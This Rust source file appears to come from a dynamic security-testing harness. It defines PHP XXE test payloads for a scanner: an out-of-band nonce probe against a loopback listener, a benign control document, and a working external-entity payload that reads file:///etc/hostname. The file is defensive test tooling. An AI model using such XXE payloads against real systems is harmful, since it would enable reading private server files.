//! PHP `Cap::XXE` payloads — `simplexml_load_string` under
//! `libxml_disable_entity_loader(false)`.
//!
//! Vuln payload: an XML document declaring an external entity that
//! the harness's instrumented parser expands inside `<data>`; the
//! shim writes `ProbeKind::Xxe { entity_expanded: true }` once it
//! sees the entity body substitute into the parsed output.
//!
//! Benign control: a well-formed XML document with no doctype, so
//! the parser has no entity to resolve and the shim writes
//! `entity_expanded: false`.
//!
//! OOB-nonce variant (added 2026-05-21): when the runner attaches an
//! [`crate::dynamic::oob::OobListener`] the harness's
//! `libxml_set_external_entity_loader` callback performs a real
//! `file_get_contents` against the loopback URL so the listener records
//! the per-finding nonce.  Ordered first so iteration exercises OOB
//! before the doctype-entity vuln triggers and short-circuits.

use super::super::{CuratedPayload, Oracle, PayloadProvenance, PayloadRef};
use crate::dynamic::oracle::ProbePredicate;

pub const PAYLOADS: &[CuratedPayload] = &[
    CuratedPayload {
        bytes: b"",
        label: "xxe-php-oob-nonce",
        oracle: Oracle::OobCallback { host: "127.0.0.1" },
        is_benign: false,
        provenance: PayloadProvenance::Curated,
        since_corpus_version: 15,
        deprecated_at_corpus_version: None,
        fixture_paths: &["tests/dynamic_fixtures/xxe/php/vuln.php"],
        oob_nonce_slot: true,
        probe_predicates: &[],
        benign_control: None,
        no_benign_control_rationale: Some(
            "OOB-nonce XXE payload self-confirms via the per-finding listener \
             callback when libxml's external-entity loader fetches the \
             loopback URL; no benign URL can hit the nonce path.",
        ),
    },
    CuratedPayload {
        bytes: br#"<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<data>&xxe;</data>"#,
        label: "xxe-php-doctype-entity",
        oracle: Oracle::SinkProbe {
            predicates: &[ProbePredicate::XxeEntityExpanded {
                require_expanded: true,
            }],
        },
        is_benign: false,
        provenance: PayloadProvenance::Curated,
        since_corpus_version: 9,
        deprecated_at_corpus_version: None,
        fixture_paths: &["tests/dynamic_fixtures/xxe/php/vuln.php"],
        oob_nonce_slot: false,
        probe_predicates: &[ProbePredicate::XxeEntityExpanded {
            require_expanded: true,
        }],
        benign_control: Some(PayloadRef {
            label: "xxe-php-benign",
        }),
        no_benign_control_rationale: None,
    },
    CuratedPayload {
        bytes: br#"<?xml version="1.0"?>
<data>hello</data>"#,
        label: "xxe-php-benign",
        oracle: Oracle::SinkProbe {
            predicates: &[ProbePredicate::XxeEntityExpanded {
                require_expanded: true,
            }],
        },
        is_benign: true,
        provenance: PayloadProvenance::Curated,
        since_corpus_version: 9,
        deprecated_at_corpus_version: None,
        fixture_paths: &["tests/dynamic_fixtures/xxe/php/benign.php"],
        oob_nonce_slot: false,
        probe_predicates: &[],
        benign_control: None,
        no_benign_control_rationale: None,
    },
];
